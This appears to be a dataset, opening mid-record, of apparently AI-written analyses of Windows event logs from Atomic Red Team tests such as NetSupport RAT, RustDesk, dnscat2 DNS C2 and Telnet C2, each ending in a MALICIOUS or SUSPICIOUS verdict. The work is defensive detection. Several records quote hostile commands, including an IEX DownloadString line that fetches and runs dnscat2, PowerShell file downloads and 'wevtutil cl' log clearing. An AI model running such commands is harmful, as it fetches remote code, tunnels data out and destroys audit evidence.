- **Execution of Cmd.exe with a Suspicious CommandLine:** A process was launched with a command referring to `AtomicRedTeam\T1105\src\T1105.bat` which is indicative of something being executed from the Atomic Red Team, known for testing adversarial techniques. This implies possible testing of DOD (Defense On Demand) techniques, which could be either benign testing or suspicious activity depending on context.

- **Many Microsoft Edge Update Processes:** These seem scattered and reflect a typical automated software update process initiated by the system's update managers. While these have a high volume, they don't show immediate signs of compromise given no unusual command lines or context.

### Assessment:
- The logs present multiple instances where logs were cleared by `admin_test` using `wevtutil.exe`, particularly within the security log (Event ID: 1102) and other essential operational logs. Such log-clearing actions are suspicious and raise concerns about attempts to hide the traces of unauthorized activities.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Conduct a Thorough Investigation:**
   - Verify the intent and authorization behind the actions of `admin_test`.
   - Review and recover (if possible) any forensic data related to key cleared logs.
   - Investigate other logs and system activities associated with `admin_test` to identify what actions might have been masked by cleared logs.

2. **Account Monitoring and Security:**
   - Monitor the `admin_test` account for further anomalous activity.
   - Consider temporarily disabling or restricting the account pending further review.

3. **System Integrity Check:**
   - Check the system for signs of tampering or unauthorized configurations.
   - Perform a comprehensive malware scan of `Server002`.

4. **Alert Security Teams:**
   - Immediately alert security and IT teams for incident response and containment.
   - Follow incident response protocols to secure other parts of the network.

5. **Engage Stakeholders:**
   - Communicate the findings with management and necessary stakeholders to determine next steps regarding informing affected parties or conducting further forensic analysis.

6. **Future Audit and Monitoring:**
   - Establish rigorous audit trails and monitoring systems for sensitive operations like log-clearing.
   - Reassess and tighten security policies regarding administrative actions and command-line executions."
NetSupport - RAT Execution,"Upon reviewing the provided Windows event logs, several key findings suggest suspicious and potentially malicious activities:

1. **Clearing Event Logs:** 
   - The Security event log (EventID: 1102) and System log (EventID: 104) entries indicate that logs have been cleared. The command to clear security and system logs was executed by the user “admin_test” using `wevtutil.exe`, which suggests possible log tampering to cover tracks of malicious activities.
   
2. **Unusual Process Executions:**
   - Multiple instances of `wevtutil.exe` were used to clear different logs (Security, Application, System, and Windows PowerShell), which is not a routine activity and points towards an attempt to hide actions taken on the system.
   - A PowerShell script is observed starting the process `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1219_NetSupport.exe""` which is perceptibly part of the [Atomic Red Team testing suite](https://github.com/redcanaryco/atomic-red-team), often used for red-team exercises and simulations of attack techniques.
   
3. **Process Execution of Suspicious Tools:**
   - NetSupport Manager, an IT remote support and monitoring tool, was executed with silent install parameters via PowerShell which can be leveraged by attackers to maintain persistent access remotely.
   - The tool attempted installation (as indicated by MsiInstaller events) but failed. Despite the failure of installation as per log event 2387, the execution indicates an intent to deploy remote management software potentially without user consent.

4. **High Integrity Level Executions:**
   - The processes involved were executed with high integrity levels, meaning they had elevated privileges on the system, thereby emphasizing the risk if those were executed by an adversary.

5. **Edge Update Processing:**
   - There’s evidence of Microsoft Edge Update processes; however, based on their typical function and execution under NT AUTHORITY\SYSTEM, they appear consistent with legitimate system update activities and are not viewed as suspicious.

### Resolution:

Based on the analysis of the Windows event logs, the identified activities fit the criteria for `SUSPICIOUS` behavior and warrant further investigation. These findings include cleared event logs, execution of potential dual-use administrative tools (NetSupport Manager), and use thereof in a potentially unauthorized manner. Investigations should probe the legitimacy of these activities, the intention of the user, and ensure there are no unauthorized backdoors or persistent threats installed due to the suspicious activity pattern.

### Guidance:

- Conduct a thorough investigation to confirm if the actions were authorized as part of an internal red team exercise or training.
- Verify the ownership and purpose of the involved user account (`admin_test`), and audit recent activity.
- Analyze the overall security posture of the system and network to identify and remediate potential points of compromise.
- Ensure logging mechanisms are secured to prevent unauthorized clearing in the future.
- Consider isolation of the affected system and perform a detailed forensic analysis to ensure no unseen compromise exists."
RustDesk Files Detected Test on Windows,"Upon careful analysis of the provided log entries across different channels (System, Security, Application, Sysmon, and Windows PowerShell), I have identified several suspicious patterns that require attention:

1. **Log Clearing Events**: There are multiple instances of event logs being cleared shortly after each other, performed by the same user ""admin_test"". This includes clearing logs from the System, Security, and Windows PowerShell channels. Clearing event logs is a technique often used by malicious actors to cover their tracks, especially when conducted in such quick succession and without an apparent legitimate reason.

2. **Suspicious PowerShell Activity**: 
   - There is a PowerShell command that downloads and executes a file (`rustdesk-1.2.3-1-x86_64.exe`) from an external source (https://github.com). This behavior is suspicious as downloading and executing files from the internet via PowerShell scripts could indicate attempts to install potentially unwanted or malicious software. The downloaded executable is later observed to be terminated using `taskkill`, suggesting automated execution.

3. **Unexpected Privileged Actions**: 
   - The user ""admin_test"" has executed processes with high integrity levels, including administrative actions that typically require elevated privileges. This includes the execution of processes like `wevtutil.exe`, which is used to manage and clear event logs.

4. **Network Connections**: 
   - Some processes such as `rustdesk.exe` suggest an installation of a remote management tool, indicating potential unauthorized access or remote control setup.

Based on these observations:

- **Log Clearance** that coincides with suspicious activities such as downloading and executing remote software using PowerShell.
- **Remote Access Tool Installation**: The `rustdesk` installation, especially following the suspicious download, could imply attempts at setting up remote access or control over the system.
- **Use of High-Privilege Commands** by a user named ""admin_test"", suggesting possible misuse of administrative privileges.

Given these findings, the activity recorded in the logs can be labeled as **MALICIOUS**. 

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate the host from the network to prevent further potential unauthorized access or data exfiltration.
2. **Forensic Analysis**: Conduct a deeper forensic investigation, including file integrity checks and analysis of any unknown or newly installed applications.
3. **Review and Revocation**: Review user permissions, particularly for the ""admin_test"" account, and consider revoking or reducing privileges until a full security posture can be assessed.
4. **Incident Response Operations**: Engage the incident response team to assess potential lateral movement or additional compromise within the network.
5. **Log Monitoring Enhancements**: Implement stricter monitoring of administrative actions and log clearance events."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"After thoroughly analyzing the provided log entries, several events raise concerns regarding potential malicious activity:

1. **Log Clearing Activity**:
   - Multiple instances of the `wevtutil` command are observed clearing different event logs (Security, System, Windows PowerShell logs). The command `wevtutil cl` is used for this purpose.
   - The Security log (Event ID 1102) shows the log was cleared by the user `admin_test`.
   - This behavior is unusual as log clearing is generally not performed frequently, especially across multiple logs, and can indicate an attempt to cover tracks after malicious activity.

2. **PowerShell Activity**:
   - There is a detailed and suspicious PowerShell script execution. The script imports a module named `Extract-Invoke-PSImage.ps1` and attempts to extract data from an image file `evil_kitten.jpg`.
   - The script decodes base64 content, indicating the potential execution of hidden commands or data exfiltration techniques.
   - This type of script activity aligns with tactics observed in fileless malware attacks or the execution of encoded malicious payloads.

3. **Unusual File Paths and Context**:
   - The PowerShell script operates within a temp directory with a notable path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\ExternalPayloads\\`), which may suggest the execution of a test or adversarial simulation tool (Atomic Red Team is a known adversarial simulation framework).
   - However, the running of scripts without proper clearance or outside known testing scenarios can still pose a significant security risk.

4. **Sysmon Logs**:
   - The Process Creation events frequently show `wevtutil.exe` under the user `admin_test` with high integrity, reinforcing indecent behaviors such as log tampering.
   - As part of the forensic evidence, these show consistency with the events registered in the Security and System logs about log clearing.

### Assessment

- **Resolution**: MALICIOUS

The combination of log clearing activities, suspicious PowerShell script execution, and the involvement of potentially simulated attack tactics without known authorization deterministically point to malicious behavior. The behavior is consistent with attempts to carry out covert operations and cover tracks. There’s a strong indication of a security breach or at the very least, unauthorized testing or red teaming activities.

### Guidance on How to Proceed

1. **Immediate Containment and Investigation**:
   - Isolate the affected host (Server002) from the network to prevent further potential data leakage or lateral movement.
   - Conduct a thorough investigation to trace back the access to user `admin_test` and validate if it's a legitimate account or compromised.

2. **Review and Remediation**:
   - Review and verify the purpose and authorizations of the script executions and log clearing commands.
   - Audit other similar activities across your network to identify any further compromised systems or unauthorized activities.

3. **Enhance Monitoring and Controls**:
   - Strengthen PowerShell execution logging and monitoring through better use of PowerShell Script Block Logging and System Monitoring (Sysmon).
   - Implement stricter controls and anomaly detection for administrative actions, such as log clearings, especially when linked to high-privilege accounts.

4. **Communication and Reporting**:
   - Report the incident to appropriate internal and possibly external parties as per your incident response plan.
   - If the activity was indeed malicious, coordinate with legal and compliance teams for further action."
Download a file using wscript,"After analyzing the provided log entries, I've identified several indicators of potentially suspicious activity:

1. **Log Clearing Events**: 
   - The logs contain several instances of what appears to be the clearing of event logs which is a common tactic used by malicious actors to hide their tracks. Specifically, event ID 104 in the System log and event ID 1102 in the Security log indicate that someone using the account ""admin_test"" cleared logs at 12:19:12 on October 24, 2024. This activity is highly suspicious.

2. **Suspicious Script Execution**:
   - There's an entry in the Sysmon log indicating the execution of a script (event IDs 18008, 18009, and 18010) through `cmd.exe` with a command-line argument that involves executing a script via `wscript.exe` located in a temporary directory. The script appears to be part of an Atomic Red Team test (T1105 - Ingress Tool Transfer), which is commonly used for adversary emulation and can sometimes be leveraged for malicious purposes if not authorized.

3. **Purposeful Usage of System Utilities**:
   - Multiple instances of the `wevtutil.exe` command are being run with arguments to clear different logs, such as Sysmon, System, and Application logs. This behavior aligns with attempts to cover tracks as it directly interacts with event logs.

4. **Unexpected PowerShell Execution**:
   - There is an execution of `powershell.exe` (event ID 17976) by the user ""admin_test."" Without details on the command involved, PowerShell activity by itself is not inherently malicious, but combined with the context of other log-clearing activities, it raises concern as a potential beacon of a more comprehensive attack.

5. **Other Anomalous Behavior**:
   - Utilization of system processes and tools such as `whoami.exe`, `hostname.exe`, and `cmd.exe` with non-standard arguments or in rapid succession often suggests reconnaissance or enumeration activities.

**Assessment**:
Based on the analysis of these logs, including the combination of log clearance, script execution, and the use of system utilities, the observed activities fit a pattern consistent with malicious behavior intended to obfuscate actions and perform potentially unauthorized operations.

**Resolution**: 
**MALICIOUS** - The logs contain clear indicators of malicious activities. The rapid sequence of log management, script execution, and utilization of system tools warrant immediate action.

**Guidance**:
- **Immediate Containment**: Isolate the involved system (""Server002"") from the network to prevent further malicious actions.
- **Investigate User Activity**: Close monitoring of the user ""admin_test"" and any anomalies linked to this or related accounts.
- **Review Access Control**: Ensure least privilege practices are enforced for all accounts.
- **Forensic Analysis**: Conduct a deeper forensic investigation to understand the full extent of the compromise and possible data exfiltration.
- **Implement Monitoring**: Strengthen logging and alerting policies, especially focused on log clearance events and PowerShell usage across the environment."
Malicious User Agents - CMD,"Based on the analysis of the provided Windows event logs, a few key points stand out that indicate suspicious activities:

1. **Log Clearing Activity**:
   - The security log indicates that event logs were cleared (Event ID 1102) by the user ""admin_test"". This can be a sign of malicious activity as attackers often clear log files to cover their tracks. 
   - Similarly, there are multiple log-clear events in the system log (Event ID 104) across various channels such as System, Windows PowerShell, and Security. This simultaneous clearing of multiple logs is highly suspect and aligns with typical post-exploitation behavior.

2. **Unexpected Use of `wevtutil.exe`**:
   - The use of `wevtutil` to clear event logs is unusual in routine operations, especially across different log channels executed by the same user. This behavior accompanied by high integrity level permissions (High integrity) further enhances the suspicion of unauthorized activities.

3. **Command Line Tool Execution**:
   - There is a `cmd.exe` process spawning several `curl.exe` commands aimed at accessing `www.google.com` with various user agents. This type of network activity could indicate possible data exfiltration attempts or reconnaissance activities. The use of multiple user agents is typically used to evade detection or bypass restrictions by appearing as legitimate traffic.

4. **PowerShell Invocation**:
   - The invocation of PowerShell (`powershell.exe`) is something to note as it is commonly leveraged by attackers for executing scripts post-compromise, though the specifics of the PowerShell command executed are not detailed in this log snippet.

5. **Use of Temporary Edge Executables**:
   - There's a reference to a temporary `MicrosoftEdgeUpdate.exe` within `Microsoft\\Temp`, which might be indicative of a malicious or unauthorized software update attempt. A legitimate install should not generally be within a temporary directory.

**Assessment**:
Given the elements above, particularly the log clearing associated with `admin_test`, the unusual invocation of system tools like `wevtutil.exe`, and the suspicious network communications using `curl.exe`, the activities in the logs collectively suggest potential malicious intent.

**Resolution**:
- **MALICIOUS**: The evidence strongly supports malicious behavior, particularly actions to obfuscate and persist on the system. Immediate action is recommended to further investigate, potentially isolate the system, and perform a thorough forensic analysis to determine the extent of compromise and the attack vector. Initiating an Incident Response process and taking remediation steps would be prudent next actions."
Windows - PowerShell Download,"**Detailed Analysis of the Logs:**

1. **Security Log Analysis:**
   - **Event ID 1102:** This indicates the security event log was cleared by the user ""admin_test."" Clearing event logs is often associated with an attempt to cover tracks after malicious activity. 
   - The user involved, ""admin_test,"" suggests someone with administrative rights performed this action. If this is unexpected behavior from this user, it raises concerns.

2. **System Log Analysis:**
   - **Event ID 104:** Reflects that the system log was cleared as well by the ""admin_test"" user. Similar to the security log clearing, this action suggests potential tampering with evidence of activity.

3. **Windows PowerShell Log Analysis:**
   - PowerShell activity is noted where a script was used to download a file from an external URL. The command executed was: `powershell.exe & {(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", ""$env:TEMP\\Atomic-license.txt"")}`.
   - Although downloading a plain text file from a well-known repository does not directly indicate malicious intent, downloading files from the internet using PowerShell needs scrutiny, especially given the suspicious nature of other activities.

4. **Sysmon Log Analysis:**
   - **Event ID 1:** Multiple instances of `wevtutil.exe` were executed to clear different logs (Sysmon, Application, System, Windows PowerShell). This tool is used to manipulate log files and, under these circumstances, likely signifies an attempt to erase evidence.
   - Processes were executed by the ""admin_test"" user with a high integrity level, indicating elevated privileges were used.
   - The user ""admin_test"" was involved in executing conhost.exe after `wevtutil.exe` executions, which points towards potential console operations attempting to hide or manage outputs discreetly.
   - The download command executed via PowerShell reported in the Sysmon logs as well corroborates the PowerShell log's findings.
   - The sysmon activity also indicates processes related to the system's routine updates (Microsoft Edge Update). These activities appear benign by nature but are part of the series of events happening alongside potentially improper actions.

5. **Application Log Analysis:**
   - **Edge Update Service Stopped:** Routine update service activity was logged twice around the times of suspicious PowerShell executions and log clearances.

**Assessment:**

The analysis indicates a pattern of behavior consistent with covering tracks: event logs are being cleared (security, system, Sysmon, PowerShell) by an administrative account, alongside the execution of PowerShell to potentially download files from the internet. While some activity, such as `Microsoft Edge Update`, might normally appear benign, the context in which it is occurring—during a series of log tampering—is concerning. The activities collectively suggest an attempt to obfuscate actions taken on the system.

**Resolution:**

- **Resolution:** MALICIOUS
- **Guidance:** Immediate investigation is required. Analyze the network activity associated with this host's user account. Examine user access controls and any external communications that may have occurred around the same time. Consider isolating the system to prevent potential exfiltration of data and notify the incident response team to conduct a deeper forensic analysis and verification."
DNS over HTTPS Long Domain Query,"### Detailed Analysis of the Windows Event Logs

#### Security and System Logs

1. **Event Log Cleared Activity**:
   - The Security, System, and Windows PowerShell event logs were cleared by the user `admin_test` on `Server002`. The process used was `wevtutil.exe`, which is a legitimate utility but can be used to cover tracks, indicating potential malicious intent. Clearing logs can hinder digital investigations and is often a red flag in security monitoring. 

2. **TimeChange Events**:
   - Event IDs 4616 in the Security log and 1 in the System log show slight time changes on the server. This may not necessarily be suspicious on its own but could be worth noting in a broader context of unusual activity.

#### Sysmon Log

1. **Command Line Usage**:
   - Multiple instances of the `wevtutil.exe` command indicate log tampering activities: `wevtutil.exe cl <log_name>`. This pattern of clearing logs is consistent with attempts to cover tracks after executing potentially unwanted or malicious activities.

2. **Suspicious PowerShell Activity**:
   - A PowerShell script execution (`T1572-doh-domain-length.ps1`) associated with the Atomic Red Team is observed. The script's path is located in a temporary directory, showing typical red team simulation or malicious activity. The use of PowerShell with encoded commands or scripts in the temp directory is often suspicious, especially if unplanned.

3. **Frequent Process Launch**:
   - Frequent executions of conhost.exe and svchost.exe are observed, spawned from various processes, indicating possible command-line operations or service-hosting scenarios. However, when combined with other findings, it suggests process obfuscation tactics.

#### Application Log

- The logs show normal Edge update service stop events. These application logs corroborate with Sysmon logs showing service-related activities, appearing mostly benign unless in combination with other red flags.

#### PowerShell Log

- Captures the use of PowerShell to execute a potentially suspicious script (`T1572-doh-domain-length.ps1`). These activities point towards either a security exercise (e.g., red team activity) or unauthorized usage.

### Assessment

- **Suspicious Activities Identified**:
  - Log clearing using `wevtutil.exe` is typical in malicious activities.
  - Execution of a PowerShell script from a temp directory.
  - Frequent process launches indicative of potential obfuscation.
  
### Resolution Recommendation

- **SUSPICIOUS**: These logs contain activities such as event log clearing and suspicious PowerShell execution which indicate potentially malicious actions but aren't conclusively so without further context. 

### Guidance on How to Proceed

1. **Conduct a Comprehensive Investigation**:
   - Verify whether activities around the timings of log clearing and PowerShell executions match any authorized red team or IT activities.
   - Analyze user `admin_test` activities and access logs to assess if their actions are justified or anomalous.

2. **Audit System Changes**:
   - Review changes to system policies or potential unauthorized changes in configurations.

3. **Monitor and Alert**:
   - Implement stricter monitoring for similar activities, especially log tampering and unauthorized PowerShell execution.

4. **Enhanced Security Measures**: 
   - Enhance PowerShell logging and script block logging to capture more detailed script execution data.
   - Explore endpoint detection and response (EDR) solutions for better threat visibility.

5. **User Awareness and Training**: 
   - Ensure users, especially those in admin roles, are aware of security policies and the implications of using commands like `wevtutil.exe`.

Following up on these findings with deeper forensic analysis and network traffic monitoring will help to quickly ascertain the extent of any compromise and address potential security gaps."
DNS C2,"**Detailed Analysis of Logs:**

Upon thoroughly reviewing the provided Windows event logs, several key observations point toward potentially malicious activity:

1. **Log Cleared Events (Event ID 1102 and Event ID 104):**
   - There are multiple `LogFileCleared` events in the Security, Application, and System logs (Event IDs 1102 in Security and 104 in System logs). These events are typically concerning since clearing of logs can indicate an attempt to cover tracks by a malicious actor. The `SubjectUserName` is `admin_test`, which indicates that these actions were performed by someone with administrative privileges.

2. **PowerShell Activity:**
   - The PowerShell logs reveal a suspicious command involving the use of `IEX (New-Object System.Net.Webclient).DownloadString`, which downloads a script from a GitHub repository: `https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1`. This script is associated with Dnscat2, a tool often used for creating covert channels or exfiltrating data. The invocation of `Start-Dnscat2` suggests potential unauthorized communication and data leakage. This activity is logged under Event IDs 600 and 800 in the PowerShell channel.

3. **Time Discrepancy (Event ID 1 - Kernel-General):**
   - There are several `Kernel-General` events indicating a change in system time. This could signal an attempt by an attacker to manipulate time for correlating actions or bypassing certain time-based security measures.

4. **Sysmon Logs Indicating Suspicious Use of Wevutil:**
   - Several Sysmon (Event ID 1 and 5) events capture the use of `wevtutil.exe`, a command-line utility for managing Windows Event logs, immediately followed by logs being cleared. This tool, when used by an administrator, can be an indicator of log tampering.

5. **Suspicious Process Execution:**
   - The Sysmon logs include several unusual process activities such as the execution of `csc.exe` and `conhost.exe` being spawned by processes like PowerShell, indicative of script or code execution potentially compiled and launched dynamically.

6. **Network Connections:**
   - Sysmon logs detail nslookup execution likely related to the downloaded PowerShell script, reinforcing concerns of external communications using DNS tunneling.

**Assessment:**

The combination of cleared logs, unexplained PowerShell activities involving Dnscat2, and the invocation of system utilities to potentially hide malicious activity, strongly indicates compromise. The logs demonstrate patterns typical of post-exploitation activities.

**Threats and Risks Identified:**
- Potential data exfiltration using DNS tunneling.
- Unauthorized changes or access within the system.
- Attempts to obfuscate actions by clearing logs.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Action:**
   - Isolate the affected system (`Server002`) to prevent further unauthorized communication or data leakage.
   - Change all administrative-level passwords and review account privileges to prevent further unauthorized access.
2. **Investigation:**
   - Conduct a thorough forensic investigation, focusing on identifying the full extent of the breach, capturing volatile data (such as memory dumps and active network connections), and understanding the attack vector.
   - Analyze any scripts downloaded and executed via PowerShell for their purpose and connections.
3. **Remediation:**
   - Reinforce logging and monitoring practices to detect similar activities in the future.
   - Educate users about secure practices to maintain system integrity.
   - Patch any known vulnerabilities and ensure all systems are running up-to-date security software.

   - Document the incident thoroughly and report to relevant stakeholders.

This plan should help address immediate threats, contain the breach, and reinforce system defenses against future incidents."
Telnet C2,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **PowerShell Execution**:
   - Multiple PowerShell executions are occurring with the command: `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1071\bin\telnet_client.exe 127.0.0.1 --port 23}`. 
   - The presence of a tool from ""AtomicRedTeam"" suggests potential adversary simulation or a testing exercise. This directory is often used in penetration testing frameworks to test security defenses.

2. **Event Logs Clearance**:
   - Event ID 1102 in the Security log indicates that the security event log was cleared by the user `admin_test`.
   - Similar clearance actions are recorded for System and Windows PowerShell logs. This is a common tactic used by malicious actors to hide forensic evidence.

3. **Wevtutil Executions**:
   - Wevtutil.exe is used to clear different logs (e.g., Sysmon, Application, Security) which aligns with the log clearing events. The command `wevtutil.exe cl [LogName]` is used to clear event logs, further suggesting actions taken to cover up activities.

4. **Process and User Activity**:
   - The user `SERVER002\admin_test`, an administrative user, is involved in executing various processes including PowerShell and wevtutil, possibly indicating misuse of privilege or account compromise.
   - Continuous high integrity level access indicating a privilege escalation or administrative access misuse.

5. **Edge Update Anomalies**:
   - Microsoft Edge Update processes (MicrosoftEdgeUpdate.exe) appear multiple times and under different image paths, including temporary directories (e.g., `C:\Program Files (x86)\Microsoft\Temp\EUD102.tmp\MicrosoftEdgeUpdate.exe`). While it may be legitimate updating activity, the path in a temporary directory is unusual.

#### Indicators of Malicious Activity

- **Tactics of Cover-Up**: The clearing of event logs is a red flag indicating attempts to conceal malicious activity.
- **Suspicious PowerShell Commands**: The execution of network-related client tools via PowerShell could suggest lateral movement, network reconnaissance, or further malicious activities.
- **Privilege Misuse**: Continual high integrity level processes and use of administrative tools denote potential privilege abuse.

### Assessment of the Situation

Considering the above analysis, the logs exhibit signs consistent with suspicious activity, including log tampering, potential unauthorized network access activities, and possible misuse of administrative privileges.

**Resolution**: **SUSPICIOUS**

### Guidance and Next Steps

1. **Immediate Action**:
   - Isolate the affected machine (Server002) from the network to prevent any potential lateral movement or data exfiltration.
   - Conduct a thorough account audit for `admin_test` and investigate any unusual logins or changes in permissions.

2. **Forensic Analysis**:
   - Perform a deeper investigation of the `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1071` directory and confirm if Atomic Red Team exercises were authorized.
   - Review historical data for the system to identify any potential infection vectors or additional compromised accounts.

3. **Security Measures**:
   - Strengthen PowerShell logging and monitoring to capture detailed script execution.
   - Ensure logging configurations are set to a remote server to prevent tampering.
   - Educate staff on recognizing possible signs of compromise and the importance of maintaining robust credentials.

4. **Review Update Procedures**:
   - Validate Microsoft Edge Update mechanisms across the network to ensure they are securely configured and executed from typical directory paths. Investigate why Edge Update processes are executing from temporary directories.

Engage with your organization's cybersecurity team or a third-party security expert for further assistance and validation of findings."
Malicious User Agents - Powershell,"Upon examining the provided Windows event logs, I have identified some points that stand out and require further attention:

1. **Log Clearing:**
   - There are multiple instances of log clearing activities (`wevtutil.exe cl`) in Sysmon logs, targeting different log files (System, Application, Security, and Windows PowerShell), all initiated by the same user (`SERVER002\\admin_test`). 
   - Cleared logs (`EventID: 1102` in Security, `EventID: 104` in System log) can be indicative of attempts to cover tracks, commonly observed in malicious activities.

2. **Unusual PowerShell Activity:**
   - There are PowerShell logs initiating multiple `Invoke-WebRequest` commands to access `www.google.com` with various spoofed User-Agents, unusual and rarely seen in standard operations. This could be an indication of someone testing web access or trying to perform actions that usually conform to specific browser headers.
   - The PowerShell commands are wrapped in a custom script which might further suggest automation of the process for purposes that may not be benign.

3. **User Privilege and Process Execution:**
   - Processes like `wevtutil.exe` and `powershell.exe` are executed with high integrity level, generally requiring administrative privileges.
   - While the `Microsoft Edge Installer` related activities seem extensive, they don't provide conclusive evidence of malicious intent, noticing the process has been executed by `NT AUTHORITY\\SYSTEM` could indicate a legitimate background update.

4. **System Process Activities:**
   - Apart from log clearing activities, no other unusual system processes or command-line activities were identified in the logs indicating direct harmful activities.

**Assessment:**
The log clearing events in tandem with suspicious PowerShell activities are indicative of potentially harmful behavior, which may suggest an attempt to cover unauthorized activities. However, some activities such as Edge updates can be classified under regular maintenance operations if verified with software update timelines.

**Resolution: SUSPICIOUS**
Given these observations, I would classify this log activity as SUSPICIOUS. While there's no direct evidence proving a breach or malicious intent, the events warrant further investigation. It is advised to:
- Restrict `admin_test` user account until activities and access history are reviewed.
- Correlate with other logs/sources that could provide insight into the reasons behind log clearing.
- Inspect network traffic around the `Invoke-WebRequest` timestamps to check for any signs of data exfiltration or other unexplained outbound connections.
- Ensure the sysadmin team verifies the legitimacy of Microsoft Edge updates and associated processes.
- Conduct a review into recently completed changes, installations, or security policies affecting server activities and user privileges."
File Download via PowerShell,"### Detailed Analysis of the Logs:

#### 1. Security Log:
- **EventID 1102:** This event indicates that the audit logs were cleared by the user `admin_test`. Clearing event logs is often a red flag, as it can signify attempts to hide malicious activity.
- **EventID 4616:** Indicates a system time change. This could point towards attempts to manipulate time for logging or forensic purposes.

#### 2. Windows PowerShell Log:
- **EventID 600:** Shows the execution of a PowerShell script that downloads a file from an external URL and saves/opens it as `LICENSE.txt`. The specific URL `https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt` relates to a benign license file, but executing scripts from external sources unsupervised is a potential security risk and often associated with malicious behavior.

#### 3. System Log:
- Log file clearing events are recorded here as well, correlating with the suspicious activity seen in the Security log where `admin_test` cleared logs across multiple channels.

#### 4. Sysmon Log:
- Execution of multiple instances of `wevtutil.exe` is observed. This utility is used to manage event logs, including clearing logs, which corresponds with events seen in the Security and System logs. 
- The PowerShell activity is corroborated with execution logs in Sysmon, showing the process's command line details that include downloading and running a file from the internet.
- Likely automated or scripted interaction given the swift sequence of events and interactions primarily through scripting and command line utilities.

### Assessment of the Situation:
The activity within these logs strongly suggests an attempt to obfuscate actions and possibly launch or test proof-of-concept exploitation involving script execution and log clearing. While the exact command download was benign in content, the behavior and use of tools imply a testing or reconnaissance phase for malicious actions.

### Guidance on How to Proceed:
- **Audit Credentials and Access:** Verify the necessity for `admin_test` login and monitor for any further unauthorized access attempts.
- **Implement Network Monitoring:** Examine network logs for any outbound connections to unusual domains, especially those involving script executions.
- **Increase Logging Controls:** Enforce tighter controls and alerts on clearing logs or unauthorized log access.
- **Run Thorough Antivirus/Anti-Malware Scans:** On `Server002` to identify any hidden malicious files.
- **Educate and Enforce Best Practices:** Remind users of policies regarding the execution of scripts from external sources, especially on administrative accounts.

### Resolution:

**Resolution: SUSPICIOUS** - Given the execution of potentially risky scripts, the clearing of logs, and time manipulation, these actions are suspicious enough to warrant further investigation but do not conclusively confirm outright malicious intent at this stage without additional corroborating evidence."
